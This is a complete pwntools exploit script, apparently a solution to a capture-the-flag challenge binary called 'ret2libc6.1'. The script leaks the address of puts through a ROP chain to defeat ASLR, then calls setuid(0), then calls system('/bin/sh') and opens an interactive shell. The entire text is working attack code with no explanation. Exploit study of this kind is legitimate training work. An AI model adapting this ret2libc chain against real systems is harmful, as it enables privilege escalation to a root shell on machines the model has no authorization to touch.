from pwn import *
binary = ELF('ret2libc6.1')
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols["main"]
chall_addr = binary.symbols["challenge"]
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print(libc.symbols["puts"])
rop = ROP(binary)
gadget_address = rop.find_gadget(['pop rdi', 'ret'])[0]
r = process("ret2libc6.1")
# First Stage 
payload = b'A'*56+p64(gadget_address)+p64(puts_got)+p64(puts_plt)+p64(0x000000000040101a)+p64(0x40203c)
r.read()
r.send(payload)
resultLeak = r.read()[:15]
resultLeak = resultLeak[9:].hex()
original_bytes = bytes.fromhex(resultLeak)
reversed_bytes = original_bytes[::-1]
reversed_hex = reversed_bytes.hex()
log.info(f"Leaked Puts from Glibc {reversed_hex}")
leak = int(reversed_hex,16) - libc.symbols["puts"]
system = leak +libc.sym['system']
suid = leak +libc.sym['setuid']
BIN_SH = next(libc.search(b"/bin/sh"))
bin_addr = BIN_SH +leak
log.info(f"basse Addr glibc {hex(leak)}")
log.info(f"SYSTEM Addr {hex(system)}")
log.info(f"/bin/sh Addr {hex(bin_addr)}")
log.info(f"Setuid Addr {hex(suid)}")
#Second Stage
payload = b'A'*56+p64(gadget_address)+p64(0x0)+p64(suid)+p64(0x000000000040101a)+p64(0x40203c)
r.send(payload)
# #Third Stage
payload=b'A'*56+p64(gadget_address)+p64(bin_addr)+p64(0x000000000040101a)+p64(system)
r.send(payload)
r.interactive()